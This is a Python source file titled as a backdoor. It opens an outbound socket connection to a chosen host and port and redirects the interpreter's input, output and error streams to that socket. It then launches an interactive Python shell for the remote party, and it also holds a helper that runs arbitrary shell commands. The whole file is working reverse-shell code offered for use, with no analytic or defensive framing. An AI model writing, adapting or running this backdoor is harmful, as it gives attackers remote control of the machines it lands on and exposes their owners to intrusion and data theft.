"""usage: pyterpreter-backdoor.py [-h] [-l HOST] [-p PORT] [-f FAMILY] [-t TYPE]
                               [--protocol PROTOCOL] [--fileno FILENO]

options:
  -h, --help            show this help message and exit
  -l HOST, --host HOST  The IP address to connect to
  -p PORT, --port PORT  A comma separated list of ports to try to connect to
  -f FAMILY, --family FAMILY
                        The socket family to use
  -t TYPE, --type TYPE  The socket type to use
  --protocol PROTOCOL   The socket protocol to use
  --fileno FILENO       The file descriptor to use"""

import socket
import subprocess
import code
import sys
import argparse

class SocketIO(socket.socket):
    def __init__(self, **kwargs):
        socket.socket.__init__(self, **kwargs)
    def write(self, text):
        return self.send(text.encode())
    def readline(self):
        return self.recv(2048).decode()
    def flush(self):
        return 

def execute(cmd):
    ph = subprocess.Popen(cmd,shell=True, stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
    results, errors = ph.communicate()
    results = results + errors
    return results.decode()
        


if __name__ == "__main__":
    parser=argparse.ArgumentParser()
    parser.add_argument('-l', '--host', 
                        required=False, 
                        action='store', 
                        default="127.0.0.1", 
                        help='The IP address to connect to')
    parser.add_argument('-p', '--port',
                        required=False,
                        type=int, 
                        default=6969, 
                        help="A comma separated list of ports to try to connect to")
    
    parser.add_argument('-f', '--family',
                        required=False,
                        default=socket.AF_INET,
                        type=lambda s: getattr(socket, s),
                        help="The socket family to use")
    parser.add_argument('-t', '--type',
                        required=False,
                        default=socket.SOCK_STREAM,
                        type=lambda s: getattr(socket, s),
                        help="The socket type to use")
    parser.add_argument('--protocol',
                        required=False,
                        default=-1,
                        type=int,
                        help="The socket protocol to use")
    parser.add_argument('--fileno',
                        required=False,
                        default=None,
                        type=int,
                        help="The file descriptor to use")
    
    args=parser.parse_args()

    # Initialize the socket and connect to the host and port
    s = SocketIO(family=args.family, type=args.type, proto=args.protocol, fileno=args.fileno)
    s.connect((args.host, args.port))
    outgoing_ip, outgoing_port = s.getsockname()
    
    # Replace the standard input, output, and error streams with the socket
    sys.stdout=sys.stdin=sys.stderr=s

    # Start an interactive shell
    code.interact(local=locals(), 
                  banner=f"[+] Connection from {outgoing_ip}:{outgoing_port} to {args.host}:{args.port}\n[*] Python Version: {sys.version}\nPlatform: {sys.platform}\n",
                  exitmsg=f"[-] Disconnected from {outgoing_ip}:{outgoing_port}\n")
    # Close the socket
    s.close()
